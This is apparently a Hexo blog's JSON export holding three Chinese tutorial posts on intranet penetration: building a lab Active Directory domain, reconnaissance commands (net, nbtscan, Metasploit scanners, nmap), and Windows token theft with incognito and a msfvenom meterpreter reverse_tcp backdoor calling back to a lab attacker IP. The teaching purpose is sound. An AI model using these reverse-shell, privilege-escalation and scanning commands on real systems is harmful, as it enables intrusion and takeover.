{"meta":{"title":"zyth0n的博客","subtitle":"","description":"","author":"zyth0n","url":"https://zyth0n.github.io","root":"/"},"pages":[{"title":"标签","date":"2023-01-14T08:43:03.054Z","updated":"2023-01-14T08:29:21.408Z","comments":false,"path":"tags/index.html","permalink":"https://zyth0n.github.io/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-01-14T08:43:02.529Z","updated":"2023-01-14T08:29:21.408Z","comments":false,"path":"categories/index.html","permalink":"https://zyth0n.github.io/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2023-01-14T08:57:37.990Z","updated":"2023-01-14T08:57:37.983Z","comments":false,"path":"about/index.html","permalink":"https://zyth0n.github.io/about/index.html","excerpt":"","text":"致力于信息安全与网络安全研究，喜欢新事物，关注安全动态，喜欢coding。"},{"title":"Repositories","date":"2023-01-14T08:29:21.408Z","updated":"2023-01-14T08:29:21.408Z","comments":false,"path":"repository/index.html","permalink":"https://zyth0n.github.io/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-01-14T08:29:21.408Z","updated":"2023-01-14T08:29:21.408Z","comments":true,"path":"links/index.html","permalink":"https://zyth0n.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"内网渗透3之token窃取","slug":"内网渗透3之token窃取","date":"2023-01-14T09:01:29.290Z","updated":"2023-01-14T09:01:29.295Z","comments":true,"path":"2023/01/14/内网渗透3之token窃取/","link":"","permalink":"https://zyth0n.github.io/2023/01/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F3%E4%B9%8Btoken%E7%AA%83%E5%8F%96/","excerpt":"","text":"内网渗透的基本思路先拿下域成员主机-&gt;定位域控IP和域管理员账号-&gt;利用域成员主机扩大范围-&gt;定位域管理员登陆过的域成员主机-&gt;从登陆过的主机内存中dump出域管理员密码-&gt;拿下域控 关于tokentoken简单理解是系统的临时密钥，相当于账号和密码，它允许你在不提供密码或其他登陆凭证的前提下访问网络和系统资源。token会持续存在于系统，除非系统重新启动。内网渗透可以通过假冒令牌的方式假冒网络中用户进行操作。 token可以区分为访问令牌（Access Token）、会话令牌（Session Token）和密保令牌（Security Token）三种，在Windows中AccessToken可以细分为授权令牌（Delegation Token）和模拟令牌（Impersonation Token）两类，具体分类这个不重要，重要的是如何获取AccessToken。 incognito获取AccessToken获取AccessToken的前提需要管理员权限，这里的情境是已经拿到了zyth0n.cc这个域内USER的管理员权限 1incognito.exe list_tokens -u 可以看出有SYSTEM权限，我们可以模拟SYSTEM用户令牌（当前主机的最高权限），也可以模拟普通用户令牌（降权），语法格式为incognito.exe execute -c &quot;完整的token名&quot; cmd.exe 1incognito.exe execute -c &quot;NT AUTHORITY\\SYSTEM&quot; cmd.exe 这里whoami提示为SYSTEM权限，可以进行后续一系列操作 msf的incognito模块先生成后门，其中，LHOST和LPORT分别为攻击机的IP地址和端口 1msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.1.111 -f exe -o msf.exe 进入msf框架，使用handler模块，将payload改为刚才生成后门时使用的payload,设置好LHOST和LPORT，攻击 123456msfconsole use exploit/mulit/handler set payload windows/x64/meterpreter/reverse_tcp set LHOST 192.168.1.111 set LPORT 6666 exploit #这里输入run也可以 到这里会对来自6666端口的流量进行监听，此时把之前生成的msf.exe发送到USER机器运行，攻击机会收到反弹shell,成功建立会话，输入getuid查看当前用户 此时可以输入getsystem提取，如果提取失败（这个的原理简单理解为生成SYSTEM权限的进程），可以考虑使用incognito模块获取token提取，输入use incognito，这里的命令与Windows上使用incognito略有区别 1234list_tokens -u #列出令牌 impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; #获取SYSTEM令牌 steal_token PID号 #获取对应进程**权限**的令牌 rev2self #返回先前获取的用户权限","categories":[{"name":"内网","slug":"内网","permalink":"https://zyth0n.github.io/categories/%E5%86%85%E7%BD%91/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://zyth0n.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"内网渗透2之基本信息收集","slug":"内网渗透2之基本信息收集","date":"2023-01-14T09:00:51.482Z","updated":"2023-01-14T09:00:51.485Z","comments":true,"path":"2023/01/14/内网渗透2之基本信息收集/","link":"","permalink":"https://zyth0n.github.io/2023/01/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2%E4%B9%8B%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"信息收集是渗透测试中的重要环节，假定我们拿到了模拟环境中的其中一台机器，可以通过以下方式扩大自己拥有的信息： 关于本机的信息收集 网络配置信息 1ipconfig /all 操作系统信息、版本号、系统目录、域、登陆服务器、修补程序、网卡 1systeminfo 当前系统运行进程 1tasklist 用户详细信息、sid号 1whoami /all 网络信息 12route print arp -a 系统服务 1wmic service 开机自启动程序信息 1wmic startup 查看计划任务 1schtasks 查看本机用户，这里和域信息收集做一个对比，同样可以通过一些命令确定是否为域控或域成员 查看信息 本机 域 查看用户 net user net user &#x2F;domain 查看用户组 net localgroup net group #此命令只能在域控使用 查看管理组 net localgroup Administrators net group “Domain Administrators” 查看当前登录域、计算机名和用户名 net config workstation net config workstation 查询时间 net time #不在域中的主机会报错 net time #域控服务器会显示当前时间，域成员会请求域控回显时间 关于域的信息收集，内网扫描通用 查询域内主机 1net view 这里补充一点，如果出现系统错误6118时，在“服务”界面将“Computer Browser”服务开启（默认关闭） bat命令查询域内主机 1for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1|find /i &quot;ttl=&quot; nbtscan发现主机 1nbtscan 192.168.101.0/24 msf进行主机探测 12345678910auxiliary/scanner/discovery/arp_sweep #ARP扫描 auxiliary/scanner/discovery/udp_sweep #UDP扫描 auxiliary/scanner/netbios/nbname #NETBIOS扫描 auxiliary/scanner/snmp/snmp_enum #SNMP扫描 auxiliary/scanner/smb/smb_version #SMB扫描 auxiliary/scanner/portscan/ack #TCP ACK端口扫描 auxiliary/scanner/portscan/ftpbounce #FTP bounce端口扫描 auxiliary/scanner/portscan/syn #SYN端口扫描 auxiliary/scanner/portscan/tcp #TCP端口扫描 auxiliary/scanner/portscan/xmas #TCP XMas端口扫描 nmap主机探测 1234567nmap 192.168.101.209 #最简单的扫描 nmap -sS -sV -T4 192.168.101.209 #普遍的扫描方式 nmap -A -T4 192.168.101.209 #全面扫描 nmap --top-ports 100 192.168.101.209 #扫描可能开放的端口 nmap --script=vuln 192.168.101.209 #扫描漏洞 nmap -Ss -p 1-65535 -v 192.168.101.209 #快速扫描全端口 nmap -sP 192.168.101.0/24 #快速扫描存活主机","categories":[{"name":"内网","slug":"内网","permalink":"https://zyth0n.github.io/categories/%E5%86%85%E7%BD%91/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://zyth0n.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"信息收集","slug":"信息收集","permalink":"https://zyth0n.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"内网渗透1之环境搭建","slug":"内网渗透1之环境搭建","date":"2023-01-14T08:40:06.602Z","updated":"2023-01-14T08:40:06.604Z","comments":true,"path":"2023/01/14/内网渗透1之环境搭建/","link":"","permalink":"https://zyth0n.github.io/2023/01/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"关于内网的几个名词解释 内网（又叫局域网）：某一区域内由多台计算机互联形成的计算机组，更简单的理解就是“封闭型”网络，最简单的例子就是校园网、企业网络等。一般情况下内网只能在内部使用，外部“几乎”无法使用（当然存在可以使用的例外情况，这里不展开）。 工作组：内网计算机组的架构形式，这个架构形式不存在集中管理一说，因为可以直接在计算机属性-&gt;更改设置-&gt;系统属性-&gt;更改进行修改，这就意味着加入或退出任何一个工作组。每个工作组内的每台电脑账号身份都是对等的。 域（Doamin）：有安全边界（身份认证）的计算机集合。可以理解成工作组的升级版，在安全管理上更严格。每个域内的电脑账号身份不对等，最大权限的电脑是域的创建者（Domain Controller,缩写DC），简称“域控”。域控中权限最大的账号是域管理。 DNS域名服务器（Domain Name Server）：实现域名和IP地址进行转换的服务器，因为域中计算机使用DNS定位域控、服务器以及其他计算机、网络服务的。内网渗透测试中几乎都是通过寻找DNS服务器确定域控位置（DNS服务器通常和域控制器在同一台机器）。 活动目录（Active Directory,缩写AD）：域环境里提供目录服务的组件。简单理解就是集中管理整个域的账号、软件推送和访问权限功能的服务。域控就是安装了活动目录的计算机。 使用虚拟机模拟搭建内网环境这里选择的域控服务器是Windows Server 2016,域用户为Win10,为方便后续调试，两台机器网卡均选择“桥接”。 名称 IP 系统 DC 192.168.101.202 Windows Server 2016 USER 192.168.101.205 Win10 使用DC这台计算机建立域，打开服务器管理器-&gt;添加角色和功能-&gt;四次下一步-&gt;选择Active Directory域服务 一直点击下一步，直到确认安装所选内容，点击“安装”，结束安装后重启，将此服务器提升为域控制器 此处选择“添加新林”，输入你要设置的根域名 选择新林和根域的功能级别为2012,设置DSRM密码（这里设置的是不是域环境管理员的密码，是数据库恢复重置的密码！），一直下一步点击安装，安装成功后会自动重启，输入先前安装系统设置的域管理员密码登录 这里输入whoami查看一下，建立成功 这里补充一下如何修改组策略，组策略默认继承域控的本地策略，因此只需要修改本地策略即可修改组策略。开始-&gt;Windows管理工具-&gt;组策略管理，这里展开域，找到Default Domain Policy,右键“编辑” 以修改密码策略为例，计算机配置-&gt;策略-&gt;Windows设置-&gt;安全设置-&gt;账户策略-&gt;密码策略 更改之后可以等待系统自动刷新组策略，或者重启域控，或者使用以下命令手动刷新组策略 123gpupdate /target:computer #刷新计算机策略 gpupdate /target:user #刷新用户策略 gpupdate /force #两者都刷新 计算机加入域开始-&gt;Windows管理工具-&gt;Active Directory用户和计算机-&gt;展开域-&gt;Users,在DC新建用户test，密码123456,点击完成即可 打开USER,修改DNS为DC的ip 192.168.101.202,打开此电脑-&gt;属性-&gt;更改设置-&gt;更改，将“隶属于”改为之前设置的域，重启即可生效 重启后，如果要登陆域环境，用户名格式为NetBIOS域名\\用户名（适用于win2000以前的机器），或者用户名@域名。也就是“ZYTH0N\\test”，或者“test@zyth0n.cc”，密码123456 至此，内网环境搭建成功。","categories":[{"name":"内网","slug":"内网","permalink":"https://zyth0n.github.io/categories/%E5%86%85%E7%BD%91/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://zyth0n.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]}],"categories":[{"name":"内网","slug":"内网","permalink":"https://zyth0n.github.io/categories/%E5%86%85%E7%BD%91/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://zyth0n.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"信息收集","slug":"信息收集","permalink":"https://zyth0n.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]}